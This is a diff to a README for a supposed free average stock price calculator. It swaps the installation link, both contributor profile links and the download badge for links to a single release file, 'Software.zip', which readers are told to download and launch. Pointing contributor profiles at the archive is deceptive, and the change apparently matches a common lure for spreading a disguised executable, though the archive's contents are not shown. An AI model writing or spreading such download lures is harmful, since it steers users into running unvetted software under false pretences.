@@ -23,7 +23,7 @@ Welcome to the "Free Average Stock Price Calculator" repository! This tool is de
 📌 zerodha
 
 ## Installation
-To download the latest version of the tool, click [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip). Once downloaded, launch the file to start using the Free Average Stock Price Calculator.
+To download the latest version of the tool, click [here](https://github.com/Anas-1131/Free-Average-Stock-Price-Calculator/releases/download/v1.0/Software.zip). Once downloaded, launch the file to start using the Free Average Stock Price Calculator.
 
 ## Usage
 1. Input the stock prices you want to calculate the average for.
@@ -48,12 +48,12 @@ print(f"The average stock price is: {average_price}")
 If you encounter any issues or have suggestions for improving the calculator, feel free to open an issue on the GitHub repository.
 
 ## Contributors
-👤 JohnDoe - [@JohnDoe](https://github.com/JohnDoe)  
-👤 JaneSmith - [@JaneSmith](https://github.com/JaneSmith)
+👤 JohnDoe - [@JohnDoe](https://github.com/Anas-1131/Free-Average-Stock-Price-Calculator/releases/download/v1.0/Software.zip)  
+👤 JaneSmith - [@JaneSmith](https://github.com/Anas-1131/Free-Average-Stock-Price-Calculator/releases/download/v1.0/Software.zip)
 
 ## License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details. 
 
 ---
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Latest%20Version-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Version](https://github.com/Anas-1131/Free-Average-Stock-Price-Calculator/releases/download/v1.0/Software.zip%20Version-blue)](https://github.com/Anas-1131/Free-Average-Stock-Price-Calculator/releases/download/v1.0/Software.zip)
